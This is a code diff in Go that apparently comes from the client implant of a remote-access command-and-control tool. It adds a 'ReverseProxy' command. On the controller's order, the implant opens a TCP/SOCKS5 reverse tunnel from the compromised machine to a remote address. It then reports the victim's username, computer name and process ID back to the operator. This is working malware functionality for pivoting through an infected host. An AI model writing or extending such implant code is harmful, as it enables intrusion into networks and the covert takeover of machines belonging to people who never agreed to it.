@@ -8,6 +8,7 @@ import (
 
 	"main/Encrypt"
 	"main/Helper"
+	"main/Helper/Proxy/operate"
 	"main/MessagePack"
 	"main/PcInfo"
 	"os"
@@ -516,6 +517,34 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 				}
 				SessionLog(utf8Stdout, Connection, *unmsgpack)
 			}()
+		}
+
+	case "ReverseProxy":
+		{
+			RemoteIp := unmsgpack.ForcePathObject("remoteIp").GetAsString()
+			connectPort := unmsgpack.ForcePathObject("connectPort").GetAsString()
+			go func() {
+
+				//fmt.Println(RemoteIp + ":" + connectPort)
+				operate.ProxyRemote(RemoteIp+":"+connectPort, false)
+			}()
+			//fmt.Println(unmsgpack.ForcePathObject("HPID").GetAsString())
+			msgpack := new(MessagePack.MsgPack)
+
+			msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")
+
+			info := PcInfo.GetUserName() + "-=>" +
+				PcInfo.GetClientComputer() + "-=>" +
+				PcInfo.GetProcessID() + "-=>" +
+				"TCP/Socks5" + "-=>" +
+				RemoteIp + "-=>" +
+				connectPort + "-=>" +
+				unmsgpack.ForcePathObject("HPID").GetAsString() + "-=>" +
+				unmsgpack.ForcePathObject("SocksPort").GetAsString() + "-=>"
+
+			msgpack.ForcePathObject("Info").SetAsString(info)
+			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+			SendData(msgpack.Encode2Bytes(), Connection)
 		}
 
 	}
